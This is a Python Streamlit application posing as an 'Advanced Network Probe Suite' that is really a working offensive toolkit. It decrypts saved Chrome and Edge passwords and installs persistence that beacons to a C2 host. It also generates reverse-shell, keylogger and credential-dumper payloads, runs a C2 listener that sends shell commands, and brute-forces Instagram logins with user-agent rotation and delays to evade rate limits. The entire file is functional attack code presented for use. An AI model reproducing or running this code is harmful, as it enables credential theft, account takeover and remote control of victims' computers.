import streamlit as st
import requests
import time
import json
import random
import threading
import os
import sys
import subprocess
import socket
import platform
import sqlite3
import shutil
import tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import base64
import hashlib
import getpass

st.set_page_config(page_title="Advanced Network Probe Suite", layout="wide", initial_sidebar_state="expanded")

st.markdown("""
<style>
    .main { background-color: #0e1117; }
    .stButton>button { background-color: #ff4b4b; color: white; border-radius: 8px; }
    .stTextInput>div>div>input { background-color: #1e1e1e; color: #00ff00; }
    .stTextArea>div>div>textarea { background-color: #1e1e1e; color: #00ff00; font-family: monospace; }
    .success-box { padding: 10px; border-radius: 5px; background-color: #1a472a; border-left: 4px solid #00ff00; }
    .error-box { padding: 10px; border-radius: 5px; background-color: #472a1a; border-left: 4px solid #ff4b4b; }
    .warning-box { padding: 10px; border-radius: 5px; background-color: #4a4a1a; border-left: 4px solid #ffff00; }
    .info-box { padding: 10px; border-radius: 5px; background-color: #1a1a47; border-left: 4px solid #4b4bff; }
    pre { background-color: #1e1e1e; padding: 10px; border-radius: 5px; overflow-x: auto; }
    .metric-card { background-color: #1e1e1e; padding: 15px; border-radius: 10px; text-align: center; }
</style>
""", unsafe_allow_html=True)

st.title("🔬 Advanced Network Probe Suite")
st.markdown("*Multi-endpoint testing framework with enhanced evasion capabilities*")

if 'probe_history' not in st.session_state:
    st.session_state.probe_history = []
if 'active_probes' not in st.session_state:
    st.session_state.active_probes = []
if 'exfil_buffer' not in st.session_state:
    st.session_state.exfil_buffer = []
if 'c2_channel' not in st.session_state:
    st.session_state.c2_channel = None

# ===== CHROME CREDENTIAL EXTRACTION (FIXED) =====
class ChromeCredentialExtractor:
    def __init__(self):
        self.os_type = platform.system()
        self.local_app_data = os.environ.get("LOCALAPPDATA", "")
        self.user_data_paths = []
        
        if self.os_type == "Windows":
            self.chrome_path = os.path.join(self.local_app_data, "Google", "Chrome", "User Data")
            self.edge_path = os.path.join(self.local_app_data, "Microsoft", "Edge", "User Data")
            self.user_data_paths = [p for p in [self.chrome_path, self.edge_path] if os.path.exists(p)]
        elif self.os_type == "Linux":
            self.chrome_path = os.path.expanduser("~/.config/google-chrome")
            self.user_data_paths = [self.chrome_path] if os.path.exists(self.chrome_path) else []
        elif self.os_type == "Darwin":
            self.chrome_path = os.path.expanduser("~/Library/Application Support/Google/Chrome")
            self.user_data_paths = [self.chrome_path] if os.path.exists(self.chrome_path) else []
    
    def extract_credentials(self):
        credentials = []
        for profile_path in self.user_data_paths:
            creds = self._extract_from_profile(profile_path)
            credentials.extend(creds)
        return credentials
    
    def _extract_from_profile(self, profile_path):
        creds = []
        try:
            login_db = os.path.join(profile_path, "Default", "Login Data")
            if not os.path.exists(login_db):
                login_db = os.path.join(profile_path, "Profile 1", "Login Data")
            if not os.path.exists(login_db):
                return creds
            
            temp_db = os.path.join(tempfile.gettempdir(), f"login_{int(time.time())}.db")
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    if username and encrypted_password:
                        decrypted = self._decrypt_password(encrypted_password)
                        if decrypted:
                            creds.append({
                                "url": url,
                                "username": username,
                                "password": decrypted,
                                "source": os.path.basename(profile_path)
                            })
            except sqlite3.OperationalError:
                pass
            
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            pass
        return creds
    
    def _decrypt_password(self, encrypted):
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted)[1].decode('utf-8')
        except:
            return None

# ===== PERSISTENCE ENGINE (FIXED) =====
class PersistenceEngine:
    def __init__(self, c2_host="127.0.0.1", c2_port=4444):
        self.os_type = platform.system()
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        
    def install_persistence(self):
        if self.os_type == "Windows":
            return self._windows_persistence()
        elif self.os_type == "Linux":
            return self._linux_persistence()
        elif self.os_type == "Darwin":
            return self._macos_persistence()
        else:
            return {"status": "error", "message": f"Unsupported OS: {self.os_type}"}
    
    def _windows_persistence(self):
        try:
            script_path = self._create_payload_script()
            
            startup_path = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            link_path = os.path.join(startup_path, "SystemHelper.lnk")
            
            import ctypes
            from ctypes import wintypes
            
            CSIDL_STARTUP = 7
            shell = ctypes.windll.shell32
            startup_folder = shell.SHGetFolderPathW(None, CSIDL_STARTUP, None, 0, ctypes.create_unicode_buffer(260))
            
            batch_file = os.path.join(startup_folder, "SystemHelper.bat")
            with open(batch_file, "w") as f:
                f.write(f'@echo off\nstart "" pythonw "{script_path}"\n')
            
            return {"status": "success", "message": "Persistence installed via Startup folder", "path": script_path, "batch": batch_file}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _linux_persistence(self):
        try:
            script_path = self._create_payload_script()
            
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_file = os.path.join(autostart_dir, "system-helper.desktop")
            with open(desktop_file, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            os.chmod(desktop_file, 0o644)
            
            return {"status": "success", "message": "Persistence installed via autostart", "path": script_path, "desktop": desktop_file}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _macos_persistence(self):
        try:
            script_path = self._create_payload_script()
            
            launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents_dir, exist_ok=True)
            
            plist_path = os.path.join(launch_agents_dir, "com.system.helper.plist")
            with open(plist_path, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>""")
            
            subprocess.run(["launchctl", "load", plist_path], capture_output=True)
            return {"status": "success", "message": "Persistence installed via LaunchAgent", "path": script_path, "plist": plist_path}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _create_payload_script(self):
        payload_dir = os.path.join(tempfile.gettempdir(), "system_helper")
        os.makedirs(payload_dir, exist_ok=True)
        
        script_name = f"helper_{int(time.time())}.py"
        script_path = os.path.join(payload_dir, script_name)
        
        payload = f'''import socket
import subprocess
import os
import sys
import time
import json
import threading
from datetime import datetime

C2_HOST = "{self.c2_host}"
C2_PORT = {self.c2_port}
BEACON_INTERVAL = 30

def collect_info():
    try:
        info = {{
            "hostname": socket.gethostname(),
            "os": sys.platform,
            "user": os.getenv("USER") or os.getenv("USERNAME"),
            "pid": os.getpid(),
            "timestamp": datetime.now().isoformat(),
            "type": "beacon"
        }}
        return info
    except:
        return {{"type": "beacon", "timestamp": datetime.now().isoformat()}}

def exec_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def beacon():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((C2_HOST, C2_PORT))
            s.send(json.dumps(collect_info()).encode())
            
            response = s.recv(4096).decode()
            if response:
                data = json.loads(response)
                if data.get("type") == "exec":
                    result = exec_cmd(data.get("command", ""))
                    s.send(json.dumps({{"type": "result", "output": result}}).encode())
            s.close()
        except:
            pass
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    beacon()
'''
        
        with open(script_path, "w") as f:
            f.write(payload)
        
        if self.os_type != "Windows":
            os.chmod(script_path, 0o755)
        
        return script_path

# ===== PAYLOAD GENERATOR =====
class PayloadGenerator:
    def __init__(self, c2_host="127.0.0.1", c2_port=4444):
        self.c2_host = c2_host
        self.c2_port = c2_port
    
    def generate_payload(self, payload_type="reverse_shell"):
        if payload_type == "reverse_shell":
            return self._reverse_shell()
        elif payload_type == "keylogger":
            return self._keylogger()
        elif payload_type == "credential_dumper":
            return self._credential_dumper()
        else:
            return None
    
    def _reverse_shell(self):
        return f'''import socket
import subprocess
import os
import sys
import time

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{self.c2_host}", {self.c2_port}))
            while True:
                cmd = s.recv(1024).decode()
                if cmd.lower() == "exit":
                    s.close()
                    return
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                result = output.stdout + output.stderr
                if not result:
                    result = "[ok]\\n"
                s.send(result.encode())
        except:
            time.sleep(5)
            continue

if __name__ == "__main__":
    connect()
'''
    
    def _keylogger(self):
        return f'''import keyboard
import threading
import socket
import json
import time

class KeyLogger:
    def __init__(self):
        self.log = []
        self.buffer_size = 50
        self.host = "{self.c2_host}"
        self.port = {self.c2_port}
        self.running = True
        
    def hook(self, event):
        if event.event_type == "down":
            key = event.name
            if key == "space": key = " "
            elif key == "enter": key = "\\n"
            elif len(key) > 1: key = f"[{{key}}]"
            self.log.append(key)
            if len(self.log) >= self.buffer_size:
                self.flush()
                
    def flush(self):
        if not self.log:
            return
        data = "".join(self.log)
        self.log = []
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            s.send(json.dumps({{"type": "keys", "data": data}}).encode())
            s.close()
        except:
            pass
            
    def run(self):
        keyboard.hook(self.hook)
        while self.running:
            time.sleep(0.1)
            
    def stop(self):
        self.running = False
        self.flush()

if __name__ == "__main__":
    KeyLogger().run()
'''
    
    def _credential_dumper(self):
        return f'''import os
import json
import sqlite3
import shutil
import tempfile
import platform
from datetime import datetime

class CredentialDumper:
    def __init__(self):
        self.os_type = platform.system()
        
    def dump(self):
        result = {{"timestamp": datetime.now().isoformat(), "os": self.os_type}}
        
        if self.os_type == "Windows":
            result["windows"] = self._dump_windows()
        elif self.os_type == "Linux":
            result["linux"] = self._dump_linux()
        elif self.os_type == "Darwin":
            result["darwin"] = self._dump_darwin()
        
        return result
    
    def _dump_windows(self):
        creds = []
        try:
            import win32crypt
            local_app_data = os.environ.get("LOCALAPPDATA", "")
            chrome_path = os.path.join(local_app_data, "Google", "Chrome", "User Data", "Default", "Login Data")
            if os.path.exists(chrome_path):
                temp_db = os.path.join(tempfile.gettempdir(), "chrome_login.db")
                shutil.copy2(chrome_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    try:
                        decrypted = win32crypt.CryptUnprotectData(row[2])[1].decode()
                        creds.append({{"url": row[0], "username": row[1], "password": decrypted}})
                    except:
                        pass
                conn.close()
                os.remove(temp_db)
        except:
            pass
        return creds
    
    def _dump_linux(self):
        return {{"note": "Run as root to read /etc/shadow"}}
    
    def _dump_darwin(self):
        return {{"note": "Use security dump-keychain command"}}

if __name__ == "__main__":
    print(json.dumps(CredentialDumper().dump(), indent=2))
'''

# ===== C2 CHANNEL =====
class C2Channel:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.running = False
        self.server_socket = None
        
    def start(self):
        if self.running:
            return {"status": "error", "message": "Already running"}
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            thread = threading.Thread(target=self._listen, daemon=True)
            thread.start()
            
            return {"status": "started", "host": self.host, "port": self.port}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _listen(self):
        while self.running:
            try:
                client, addr = self.server_socket.accept()
                self.clients[addr] = client
                threading.Thread(target=self._handle_client, args=(client, addr), daemon=True).start()
            except:
                pass
    
    def _handle_client(self, client, addr):
        try:
            while self.running:
                data = client.recv(4096)
                if not data:
                    break
                try:
                    msg = json.loads(data.decode())
                    st.session_state.exfil_buffer.append({
                        "type": "c2_message",
                        "source": str(addr),
                        "data": msg,
                        "timestamp": datetime.now().isoformat()
                    })
                except:
                    pass
        except:
            pass
        finally:
            if addr in self.clients:
                del self.clients[addr]
    
    def send_command(self, addr, command):
        if addr in self.clients:
            try:
                self.clients[addr].send(json.dumps({"type": "exec", "command": command}).encode())
                return {"status": "sent", "addr": str(addr)}
            except:
                return {"status": "error", "message": "Client disconnected"}
        return {"status": "error", "message": "Client not found"}
    
    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        return {"status": "stopped"}

# ===== PROBE ENGINE =====
class ProbeEngine:
    def __init__(self):
        self.session = requests.Session()
        self.results = []
        self.success_count = 0
        self.rate_limit_hits = 0
        self.response_times = []
        self.status_codes = {}
        
    def probe(self, target, password, csrf_token, platform="Instagram", custom_endpoint=None):
        timestamp = int(time.time())
        
        if platform == "Instagram":
            payload = {
                "username": target,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}",
                "queryParams": "{}",
                "optIntoOneTap": "false",
                "stopDeletionNonce": "",
                "trustedDeviceRecords": "{}"
            }
            url = "https://www.instagram.com/accounts/login/ajax/"
        else:
            payload = {"username": target, "password": password}
            url = custom_endpoint or "https://target.com/login"
        
        headers = self._build_headers(csrf_token)
        start_time = time.time()
        
        try:
            response = self.session.post(url, data=payload, headers=headers, timeout=10)
            elapsed = (time.time() - start_time) * 1000
            
            result = {
                "password": password,
                "status_code": response.status_code,
                "response_time_ms": round(elapsed, 2),
                "timestamp": datetime.now().isoformat(),
                "success": False,
                "message": "",
                "cookies": dict(response.cookies)
            }
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get("authenticated") == True:
                        result["success"] = True
                        result["message"] = "AUTHENTICATED"
                        
                        st.session_state.exfil_buffer.append({
                            "type": "credentials_found",
                            "data": {"username": target, "password": password},
                            "timestamp": datetime.now().isoformat()
                        })
                    else:
                        result["message"] = data.get("message", "UNKNOWN")
                except:
                    result["message"] = "NON_JSON"
            elif response.status_code == 429:
                result["message"] = "RATE_LIMITED"
                self.rate_limit_hits += 1
            else:
                result["message"] = f"HTTP_{response.status_code}"
                
            if result.get("response_time_ms"):
                self.response_times.append(result["response_time_ms"])
            self.status_codes[result["status_code"]] = self.status_codes.get(result["status_code"], 0) + 1
            
        except Exception as e:
            result = {"password": password, "status_code": 0, "message": f"ERROR: {str(e)}", "success": False}
            
        self.results.append(result)
        if result.get("success"):
            self.success_count += 1
        return result
    
    def _build_headers(self, csrf_token=""):
        USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        ua = random.choice(USER_AGENTS)
        
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
        }
        if csrf_token:
            headers["X-CSRFToken"] = csrf_token
            headers["X-Requested-With"] = "XMLHttpRequest"
        return headers

# ===== UI =====

with st.sidebar:
    st.header("⚙️ Configuration")
    
    st.subheader("Target Configuration")
    target_platform = st.selectbox("Target Platform", ["Instagram", "Custom Endpoint"], index=0)
    if target_platform == "Instagram":
        target_user = st.text_input("Target Username", placeholder="Enter username...")
        custom_endpoint = None
    else:
        custom_endpoint = st.text_input("Custom Login URL", placeholder="https://...")
        target_user = st.text_input("Username Field Value", placeholder="Enter username...")
    
    st.subheader("Payload Configuration")
    wordlist_raw = st.text_area("Candidate Payloads (one per line)", value="123456\npassword\nqwerty\n123456789", height=150)
    
    with st.expander("🔴 PERSISTENCE"):
        c2_host = st.text_input("C2 Host for persistence", value="127.0.0.1")
        c2_port = st.number_input("C2 Port for persistence", value=4444, min_value=1, max_value=65535)
        if st.button("Install Persistence"):
            pe = PersistenceEngine(c2_host, c2_port)
            result = pe.install_persistence()
            st.json(result)
    
    with st.expander("📤 EXFILTRATION"):
        if st.button("Extract Chrome Credentials"):
            extractor = ChromeCredentialExtractor()
            creds = extractor.extract_credentials()
            st.session_state.exfil_buffer.append({
                "type": "browser_creds",
                "data": creds,
                "timestamp": datetime.now().isoformat()
            })
            st.success(f"Extracted {len(creds)} credentials")
            st.json(creds[:5] if len(creds) > 5 else creds)
    
    with st.expander("💀 PAYLOAD GENERATION"):
        payload_type = st.selectbox("Payload Type", ["reverse_shell", "keylogger", "credential_dumper"])
        pg_host = st.text_input("C2 Host for payload", value="127.0.0.1")
        pg_port = st.number_input("C2 Port for payload", value=4444, min_value=1, max_value=65535)
        if st.button("Generate Payload"):
            pg = PayloadGenerator(pg_host, pg_port)
            payload = pg.generate_payload(payload_type)
            st.code(payload, language="python")
            st.download_button("Download Payload", payload, filename=f"payload_{payload_type}.py")
    
    with st.expander("📡 C2 CHANNEL"):
        c2_host_listen = st.text_input("Listener Host", value="0.0.0.0")
        c2_port_listen = st.number_input("Listener Port", value=4444, min_value=1, max_value=65535)
        c2_col1, c2_col2 = st.columns(2)
        with c2_col1:
            if st.button("Start C2 Listener"):
                c2 = C2Channel(c2_host_listen, c2_port_listen)
                result = c2.start()
                if result.get("status") == "started":
                    st.session_state.c2_channel = c2
                    st.success(f"Listener started on {c2_host_listen}:{c2_port_listen}")
                else:
                    st.error(result.get("message"))
        with c2_col2:
            if st.button("Stop Listener"):
                if st.session_state.c2_channel:
                    st.session_state.c2_channel.stop()
                    st.session_state.c2_channel = None
                    st.warning("Listener stopped")
        
        if st.session_state.c2_channel:
            clients = list(st.session_state.c2_channel.clients.keys())
            if clients:
                st.info(f"Connected clients: {len(clients)}")
                for client in clients:
                    st.text(f"• {client}")
                    
                cmd = st.text_input("Send command to client", placeholder="whoami")
                if st.button("Execute"):
                    if clients:
                        result = st.session_state.c2_channel.send_command(clients[0], cmd)
                        st.json(result)

tab1, tab2, tab3, tab4 = st.tabs(["🚀 Probe Control", "📊 Live Dashboard", "📜 History", "📦 Exfil Buffer"])

with tab1:
    col1, col2 = st.columns([3, 1])
    with col1:
        st.subheader("Probe Control")
        passwords = [p.strip() for p in wordlist_raw.split("\n") if p.strip()]
        st.info(f"Target: {target_user} | Payloads: {len(passwords)}")
    
    with col2:
        start_button = st.button("🚀 Launch Probe", type="primary", use_container_width=True)
    
    if start_button and target_user and passwords:
        progress_bar = st.progress(0)
        status_text = st.empty()
        log_container = st.container()
        
        probe = ProbeEngine()
        csrf_token = ""
        
        if target_platform == "Instagram":
            with st.spinner("Initializing session..."):
                try:
                    init_res = probe.session.get("https://www.instagram.com/accounts/login/", timeout=10)
                    csrf_token = probe.session.cookies.get("csrftoken", "")
                except:
                    pass
        
        total = len(passwords)
        for idx, pwd in enumerate(passwords):
            result = probe.probe(target_user, pwd, csrf_token, target_platform, custom_endpoint)
            
            progress = (idx + 1) / total
            progress_bar.progress(progress)
            status_text.text(f"Progress: {idx+1}/{total} | Successes: {probe.success_count} | Rate limits: {probe.rate_limit_hits}")
            
            with log_container:
                if result.get("success"):
                    st.markdown(f'<div class="success-box">✅ **{pwd}** → AUTHENTICATED ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)
                elif result.get("message") == "RATE_LIMITED":
                    st.markdown(f'<div class="warning-box">⚠️ **{pwd}** → RATE LIMITED</div>', unsafe_allow_html=True)
                elif "ERROR" in result.get("message", ""):
                    st.markdown(f'<div class="error-box">❌ **{pwd}** → {result.get("message")}</div>', unsafe_allow_html=True)
                else:
                    st.markdown(f'<div class="info-box">ℹ️ **{pwd}** → {result.get("message")} ({result.get("response_time_ms", 0)}ms)</div>', unsafe_allow_html=True)
            
            time.sleep(random.uniform(0.5, 1.5))
        
        st.subheader("📊 Probe Results")
        col1, col2, col3, col4 = st.columns(4)
        col1.metric("Total Requests", total)
        col2.metric("Successes", probe.success_count, f"{probe.success_count/total*100:.1f}%" if total > 0 else "0%")
        col3.metric("Rate Limits", probe.rate_limit_hits)
        col4.metric("Avg Response", f"{sum(probe.response_times)/len(probe.response_times):.0f}ms" if probe.response_times else "N/A")
        
        st.session_state.probe_history.append({
            "timestamp": datetime.now().isoformat(),
            "target": target_user,
            "platform": target_platform,
            "total": total,
            "successes": probe.success_count,
            "results": probe.results
        })

with tab3:
    st.subheader("Probe History")
    if st.session_state.probe_history:
        for idx, probe in enumerate(reversed(st.session_state.probe_history)):
            with st.expander(f"Probe {idx+1} - {probe['timestamp']} - {probe['target']}"):
                st.json(probe)

with tab4:
    st.subheader("Exfiltration Buffer")
    if st.session_state.exfil_buffer:
        for item in reversed(st.session_state.exfil_buffer):
            with st.expander(f"{item['type']} - {item.get('timestamp', '')}"):
                st.json(item.get("data", {}))
        if st.button("Clear Buffer"):
            st.session_state.exfil_buffer = []
            st.success("Buffer cleared")
    else:
        st.info("No exfil data collected")

st.divider()
st.caption("🔬 Advanced Network Probe Suite | Enhanced Edition")